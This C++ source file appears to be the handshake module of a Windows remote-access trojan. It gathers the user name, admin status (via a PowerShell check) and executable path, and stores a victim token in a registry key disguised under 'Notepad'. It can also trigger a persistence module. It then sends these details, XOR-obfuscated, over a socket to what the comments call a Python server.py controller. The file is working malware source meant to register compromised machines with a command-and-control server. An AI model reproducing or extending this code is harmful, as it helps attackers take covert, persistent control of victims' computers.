#include "../inc/HandShake.h"
#include "../inc/Persistence.h"
#include "../inc/common.h"
#include "../inc/other.h"
#include "../inc/Exec.h"

using namespace std;

HandShake::HandShake()
{
    a_name_user = setNameUser();                 // set the username
    a_is_admin = setIsAdmin();                   // set if the user is admin or not
    a_current_directory = setCurrentDirectory(); // set the current directory of the program

    a_token = getTokenOrSetTokenInRegistry(); // try to get the token from the registry

    if ((a_token.length()) != a_size_token) // If an error occurred and the token is not the size of a_size_token:
    {
        // Tokken not found, generate a new one
        a_token = generateToken(a_size_token);
    }
    wcout << a_token << endl;        // display the token
    a_path_prog = setLocationProg(); // set the location of the program
}

VOID HandShake::setSock(SOCKET sock)
{
    a_sock = sock; // set the socket
}

VOID HandShake::beforeHandShake()
{
    /*
    if(AUTO_MOVE)
    {
        moveProg();
    }
    */
    // a_path_prog = setLocationProg(); //set the location of the program

    if (AUTO_PERSISTENCE)
    {
        Persistence(a_is_admin, a_path_prog).main(); // activate persistence if AUTO_PERSISTENCE is set to true
    }
}

VOID HandShake::startHandShake()
{
    // ' SPLIT ' for split data in python server.py script
    wstring is_admin;
    wstring end = L"\r\n";

    if (a_is_admin)
    {
        // If admin, add "True" to the message
        is_admin = L"MOD_HANDSHAKE_IS_ADMIN" SPLIT "True";
    }
    else
    {
        // if not admin, add "False" to the message
        is_admin = L"MOD_HANDSHAKE_IS_ADMIN" SPLIT "False";
    }

    wstring path_prog = L"MOD_HANDSHAKE_PATH_PROG" SPLIT + a_path_prog; // set the path of the program
    wstring name_user = L"MOD_HANDSHAKE_NAME_USER" SPLIT + a_name_user; // set the name of the user
    wstring token = L"MOD_HANDSHAKE_TOKEN" SPLIT + a_token;             // set the token

    sendUltraSafe(a_sock, XOREncryption(is_admin));  // send the message with admin status
    sendUltraSafe(a_sock, XOREncryption(path_prog)); // send the message with program path
    sendUltraSafe(a_sock, XOREncryption(name_user)); // send the message with username
    sendUltraSafe(a_sock, XOREncryption(token));     // send the message with token
    sendUltraSafe(a_sock, XOREncryption(end));       // send the message with end of handshake
}

BOOL HandShake::setIsAdmin()
{
    vector<string> result;

    // Exécute une commande PowerShell pour savoir si l'utilisateur a des privilèges d'administrateur
    result = Exec().executeCommand(L"powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"");

    // Si la commande a renvoyé "True", l'utilisateur a des privilèges d'administrateur
    if (result[0].substr(0, 4) == "True") // Supprime la ligne de retour
    {
        return true;
    }
    else
    {
        return false;
    }
}

wstring HandShake::setNameUser()
{
    WCHAR user[UNLEN + 1];
    DWORD len_user = UNLEN + 1;

    // Récupère le nom de l'utilisateur courant
    if (GetUserNameW(user, &len_user) == 0)
    {
        return L"Unknown"; // Si erreur, retourne "Unknown"
    }
    else
    {
        wstring result(&user[0], &user[len_user]);
        return result.substr(0, result.length() - 1);
    }
}

wstring HandShake::setCurrentDirectory()
{
    WCHAR buff[MAX_PATH];

    // Récupère le répertoire courant de l'exécution du programme
    if (GetCurrentDirectoryW(MAX_PATH, buff) == 0)
    {
        _wgetcwd(buff, MAX_PATH); // Si erreur, récupère le répertoire courant en utilisant _wgetcwd()
        return (wstring)buff;
    }
    else
    {
        return (wstring)buff;
    }
}

wstring HandShake::setLocationProg()
{
    WCHAR buffer[MAX_PATH];

    // Récupère le chemin d'accès de l'exécution du programme
    if (GetModuleFileNameW(NULL, buffer, MAX_PATH) == 0)
    {
        return (wstring)L"ERROR SET LOCATION PROG"; // Si erreur, retourne "ERROR SET LOCATION PROG"
    }
    else
    {
        return (wstring)buffer;
    }
}

wstring HandShake::generateToken(CONST INT token_size) // https://www.codespeedy.com/generate-random-hexadecimal-strings-in-cpp/
{
    wstring token;
    WCHAR hex_characters[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
    INT i;

    srand(time(0)); // https://stackoverflow.com/questions/1190689/problem-with-rand-in-c
    for (i = 0; i < token_size; i++)
    {
        token += hex_characters[rand() % 16];
    }
    return token;
}

wstring HandShake::getTokenOrSetTokenInRegistry()
{
    wstring tmp_return;

    CONST WCHAR name[] = L"config"; // name of string key.
    WCHAR token[a_size_token];

    LONG status; // allows to check the situation of the functions
    HKEY hKey;

    WCHAR buffer[4096] = {0};
    DWORD lpcbData = sizeof(buffer);

    DWORD lpType = REG_SZ;

    HKEY HKEY_admin_or_not = NULL;
    WCHAR path_of_key[MAX_PATH];

    // Initialization of variables according to privileges.
    if (a_is_admin) // test if admin | if admin set  HKEY_LOCAL_MACHINE else set HKCU
    {
        // if user is admin
        HKEY_admin_or_not = HKEY_LOCAL_MACHINE;
        wcscpy(path_of_key, L"SOFTWARE\\WOW6432Node\\Notepad");
    }
    else
    {
        // if user not admin
        HKEY_admin_or_not = HKEY_CURRENT_USER;
        wcscpy(path_of_key, L"Software\\WoW6432Node\\Notepad");
    }

    // test if key exist (key = Notepad)
    status = RegOpenKeyExW(HKEY_admin_or_not, path_of_key, 0, KEY_ALL_ACCESS, &hKey); //
    if (status != 0)                                                                  // ERROR_SUCCESS = 0
    {
        // KEY Notepad no exist  | create key and set token.
        status = RegCreateKeyExW(HKEY_admin_or_not, path_of_key, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
        if (status != 0)
        {
            // if If the notepad key has not been created.
            return generateToken(a_size_token);
        }
        else
        {
            ;
            // cout << "[+] Key is create...." << endl;
        }
    }

    // get value (string)
    status = RegQueryValueExW(hKey, name, NULL, &lpType, (LPBYTE)&buffer[0], &lpcbData);

    if (status != 0) // If token no set
    {
        // string of key not found or token is not defined.
        wcscpy(token, generateToken(a_size_token).c_str()); //(data)

        // set key:
        status = RegSetValueExW(hKey, name, 0, REG_SZ, (LPBYTE)token, lpcbData);
        if (status != 0)
        {
            // If an error lores the attribution of the token. (fuck windows)
            // cout << "FATAL ERROR" << endl;
            ;
        }
        // the token was well initialized.
    }

    else
    {
        // cout << "token no set" << endl;
        RegCloseKey(hKey);
        return (wstring)buffer;
    }
    // cout << "token set " << endl;
    RegCloseKey(hKey);

    return (wstring)token;
}

// Getter of attribute a_is_admin
BOOL HandShake::getIsAdmin()
{
    return a_is_admin;
}

// Getter of attribute a_path_prog
wstring HandShake::getPathProg()
{
    return a_path_prog;
}

// Getter of attribute a_name_user
wstring HandShake::getNameUser()
{
    return a_name_user;
}

// Getter of attribute a_token
wstring HandShake::getToken()
{
    return a_token;
}

/*
VOID HandShake::moveProg()
{
   // Deplace le programme en fonction des privilèges de l'utilisateur.
    if(a_is_admin)
    {
        if((rename(a_name_prog.c_str(), (a_path_prog).c_str())!=0))
        {
            a_path_prog = a_current_directory + "\\" + a_name_prog; //if error
        }
    }
    else
    {
        //C:\Users\ang3L\AppData\Roaming\Microsoft
        //if not adminW
        if((rename(a_name_prog.c_str(),(a_path_prog).c_str()))!= 0)
        {
            //perror("Error in move prog ");
            a_path_prog = a_current_directory + "\\" + a_name_prog;
        }
    }
}
*/